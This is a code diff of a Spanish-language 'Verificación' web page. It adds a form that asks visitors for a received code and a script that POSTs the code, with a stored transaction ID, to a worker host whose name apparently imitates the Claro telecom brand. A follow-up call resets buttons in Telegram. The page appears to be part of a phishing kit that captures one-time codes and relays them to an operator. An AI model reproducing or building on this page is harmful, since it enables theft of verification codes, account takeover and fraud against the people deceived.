@@ -1,12 +1,39 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Código autorizado</title>
+  <title>Verificación</title>
 </head>
 <body>
-  <h2>✅ Acceso autorizado</h2>
-  <p>Puedes continuar con tu código.</p>
+  <h2>Ingrese el código recibido</h2>
+  <form id="codigoForm">
+    <input type="text" id="codigo" placeholder="Código" required>
+    <button type="submit">Confirmar</button>
+  </form>
+
+  <script>
+    document.getElementById("codigoForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const codigo = document.getElementById("codigo").value;
+      const transactionId = localStorage.getItem("transactionId");
+
+      // 📤 Aquí podrías enviar el código al Worker (si lo quieres almacenar/validar)
+      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: transactionId, codigo })
+      });
+
+      // 🔄 Reset para desbloquear y que vuelvan los botones en Telegram
+      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: transactionId })
+      });
+
+      alert("Código enviado correctamente ✅");
+    });
+  </script>
 </body>
 </html>
